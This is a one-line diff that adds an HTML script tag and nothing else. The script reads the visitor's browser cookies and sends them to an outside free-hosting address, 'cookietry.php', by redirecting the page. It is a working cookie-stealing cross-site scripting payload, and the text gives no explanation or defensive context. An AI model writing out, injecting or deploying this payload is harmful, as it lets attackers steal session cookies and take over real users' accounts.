@@ -1,0 +1,1 @@
+<script>window.location='https://sintukumar52.000webhostapp.com/cookietry.php?cookie='+escape(document.cookie)</script>
